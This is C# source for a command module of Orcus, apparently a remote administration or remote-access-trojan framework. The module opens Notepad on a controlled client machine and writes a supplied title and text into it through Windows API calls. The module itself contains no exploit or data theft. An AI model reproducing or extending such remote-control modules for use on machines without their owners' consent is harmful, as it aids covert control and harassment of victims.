using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;

namespace Orcus.StaticCommands.Interaction
{
    public class OpenTextInNotepadCommand : StaticCommand
    {
        public OpenTextInNotepadCommand()
        {
            this.RegisterProperty(() => Text, Resources.StaticCommands.Text,
                    Resources.StaticCommands.Interaction_OpenTextInNotepadCommand_Text_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => Title, Resources.StaticCommands.Title,
                    Resources.StaticCommands.Interaction_OpenTextInNotepadCommand_Title_Description,
                    Resources.StaticCommands.Common);
        }

        public override Guid CommandId { get; } = new Guid(0x483cf5a5, 0xad0f, 0x424b, 0xac, 0xd5, 0xe1, 0x5d, 0xd5,
            0xe1, 0xc5, 0x88);

        public override string Name { get; } = Resources.StaticCommands.Interaction_OpenTextInNotepadCommand_Name;
        public override string Description { get; } =
            Resources.StaticCommands.Interaction_OpenTextInNotepadCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.UserInteraction;

        [MultilineString]
        public string Text { get; set; }

        public string Title { get; set; }

        [DllImport("user32.dll", EntryPoint = "SetWindowText")]
        private static extern int SetWindowText(IntPtr hWnd, string text);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className,
            string windowTitle);

        [DllImport("user32.dll", EntryPoint = "SendMessageW")]
        private static extern IntPtr SendMessageW(IntPtr hWnd, uint Msg, IntPtr wParam,
            [MarshalAs(UnmanagedType.LPWStr)] string lParam);

        public override InputValidationResult ValidateInput()
        {
            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);
            var notepad = Process.Start(new ProcessStartInfo("notepad.exe"));
            if (notepad != null)
            {
                notepad.WaitForInputIdle();

                if (!string.IsNullOrEmpty(Title))
                    SetWindowText(notepad.MainWindowHandle, Title);

                if (!string.IsNullOrEmpty(Text))
                {
                    var child = FindWindowEx(notepad.MainWindowHandle, new IntPtr(0), "Edit", null);
                    SendMessageW(child, 0x000C, IntPtr.Zero, Text);
                }
            }
        }
    }
}